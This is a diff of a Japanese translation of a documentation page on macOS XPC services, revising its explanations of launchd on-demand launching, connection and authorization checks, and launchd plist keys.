 XPCサービスは、必要に応じて**launchd**によって**起動**され、すべてのタスクが**完了**した後に**シャットダウン**され、システムリソースを解放します。**アプリケーション固有のXPCコンポーネントは、アプリケーションのみが利用できる**ため、潜在的な脆弱性に関連するリスクを低減します。
 
@@ -846,11 +1033,11 @@ cat /Library/LaunchDaemons/com.jamf.management.daemon.plist
 
 ### XPCイベントメッセージ
 
-アプリケーションは、異なるイベントメッセージに**サブスクライブ**することができ、そのようなイベントが発生したときに**オンデマンドで起動**することができます。これらのサービスのセットアップは、**`LaunchEvent`**キーを含む**`launchd plistファイル`**によって行われます。
+アプリケーションは、異なるイベントメッセージに**サブスクライブ**することができ、そのようなイベントが発生したときに**オンデマンドで起動**することができます。これらのサービスの設定は、**`LaunchEvent`**キーを含む**`launchd plistファイル`**によって行われます。これらのファイルは、前述のものと同じディレクトリにあります。
 
 ### XPC接続プロセスのチェック
 
-プロセスがXPC接続を介してメソッドを呼び出そうとするとき、**XPCサービスはそのプロセスが接続を許可されているかどうかをチェックする必要があります**。そのチェック方法と一般的な落とし穴は次のとおりです：
+プロセスがXPC接続を介してメソッドを呼び出そうとするとき、**XPCサービスはそのプロセスが接続を許可されているかどうかをチェックする必要があります**。以下は、そのチェック方法と一般的な落とし穴です:
 
 {% content-ref url="macos-xpc-connecting-process-check.md" %}
 [macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
@@ -858,13 +1045,13 @@ cat /Library/LaunchDaemons/com.jamf.management.daemon.plist
 
 ### XPC認証
 
-Appleはまた、アプリが**いくつかの権限とその取得方法を設定**することを許可しています。したがって、呼び出し元のプロセスがこれらの権限を持っている場合、XPCサービスからのメソッドの呼び出しが**許可されます**：
+Appleはまた、アプリが**いくつかの権限とその取得方法を設定**することも許可しています。したがって、呼び出し元のプロセスがこれらの権限を持っている場合、XPCサービスからのメソッドの呼び出しが**許可されます**。
 
 {% content-ref url="macos-xpc-authorization.md" %}
 [macos-xpc-authorization.md](macos-xpc-authorization.md)
 {% endcontent-ref %}
 
-### Cコードの例
+### C言語のコード例
 
 {% tabs %}
 {% tab title="xpc_server.c" %}
@@ -990,15 +1177,15 @@ return 0;
 
 このファイルは、XML形式で記述されており、以下のような要素を含んでいます。
 
-- `Label`: サービスの識別子として使用される文字列です。
-- `ProgramArguments`: サービスが実行するコマンドやスクリプトのパスを指定します。
-- `EnvironmentVariables`: サービスが使用する環境変数を指定します。
-- `RunAtLoad`: サービスを起動時に自動的に実行するかどうかを指定します。
-- `KeepAlive`: サービスが異常終了した場合に自動的に再起動するかどうかを指定します。
+- Label: サービスの識別子として使用される文字列です。
+- ProgramArguments: サービスが実行するコマンドや引数のリストです。
+- EnvironmentVariables: サービスが使用する環境変数のリストです。
+- RunAtLoad: サービスを起動時に自動的に実行するかどうかを指定します。
+- KeepAlive: サービスが異常終了した場合に自動的に再起動するかどうかを指定します。
 
-このファイルを編集する際には、注意が必要です。間違った設定を行うと、サービスの動作に問題が生じる可能性があります。また、特権の昇格やセキュリティの脆弱性を引き起こす可能性もあるため、慎重に行う必要があります。
+このファイルを編集する際には、慎重に行う必要があります。間違った設定を行うと、サービスの動作に問題が生じる可能性があります。また、このファイルの編集には管理者権限が必要です。
 
-サービスの設定を変更する場合は、事前にバックアップを作成し、変更内容を慎重に検証してから適用することをおすすめします。{% endtab %}
+サービスの設定を変更する場合は、まずバックアップを作成し、変更前の設定を確認することをおすすめします。また、変更後にはサービスを再起動する必要があることに注意してください。{% endtab %}
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -1138,7 +1325,7 @@ In this section, we will explore the different IPC mechanisms available in macOS
 
 {% endtab %}
 
-{% tab title="Untitled (日本語)" %}
+{% tab title="日本語" %}
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
